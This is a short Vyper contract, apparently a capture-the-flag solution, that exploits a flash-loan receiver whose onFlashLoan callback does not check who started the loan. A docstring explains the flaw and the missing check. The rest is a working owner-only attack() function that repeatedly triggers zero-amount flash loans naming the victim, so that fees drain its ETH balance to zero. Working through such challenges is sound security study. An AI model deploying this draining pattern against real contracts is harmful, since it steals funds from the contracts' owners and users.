# @version ^0.3.7

"""
The vulnerability is in the `onFlashLoan()` function of the 
receiver contract. It does not check that the receiver contract
initiated the flashloan. Therefore anybody can initiate a flash-
loan and specify the receiver address as the initiator. This will
result in the receiver contract paying the flashFee for flash loans
it did not initiate. If the receiver contract included a check such
as `if {first address parameter} != address(this) revert {custom error}()`
it would protect against this attack.
"""

interface IPool:
    def ETH() -> address: view
    def flashLoan(
        _receiver: address,
        _token: address,
        _amount: uint256,
        data: Bytes[max_value(uint8)],
    ) -> bool: nonpayable

owner: immutable(address)

pool: IPool
receiver: address

@external
@payable
def __init__(_pool: IPool, _receiver: address):
    owner = msg.sender
    self.pool = _pool
    self.receiver = _receiver

@external
def attack():
    assert msg.sender == owner, "!owner"
    for _ in range(max_value(uint8)):
        if self.receiver.balance > 0:
            self.pool.flashLoan(
                self.receiver,
                self.pool.ETH(),
                0,
                b"",
            )
        else:
            break
